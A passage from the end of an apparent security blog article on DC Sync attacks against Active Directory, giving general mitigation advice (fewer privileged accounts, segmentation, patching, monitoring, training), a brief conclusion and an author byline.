<p><span style="color: #000000;">Limit the number of accounts with Domain Admin privileges.</span></p>
<p><span style="color: #000000;">Use tiered administrative models.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Network Segmentation:</strong></span></li>
</ul>
<p><span style="color: #000000;">Isolate domain controllers from general-purpose networks.</span></p>
<p><span style="color: #000000;">Implement strict firewall rules for DRS-related ports.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Patching and Updates:</strong></span></li>
</ul>
<p><span style="color: #000000;">Regularly update the Windows Server and client machines to patch known vulnerabilities.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Monitoring and Alerts:</strong></span></li>
</ul>
<p><span style="color: #000000;">Use tools like Microsoft Defender for Identity to monitor replication requests.</span></p>
<p><span style="color: #000000;">Set alerts for unusual permission changes or replication activities.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Training and Awareness:</strong></span></li>
</ul>
<p><span style="color: #000000;">Educate administrators about the risks associated with excessive permissions and secure AD practices.</span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">DC Sync attacks represent a significant threat to the security of an organization’s Active Directory infrastructure. By understanding the attack, simulating it in a controlled lab, and implementing detection and mitigation strategies, organizations can effectively safeguard their critical assets. Remember, regular audits and a defense-in-depth approach are key to minimizing risks.</span></p>
<p><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
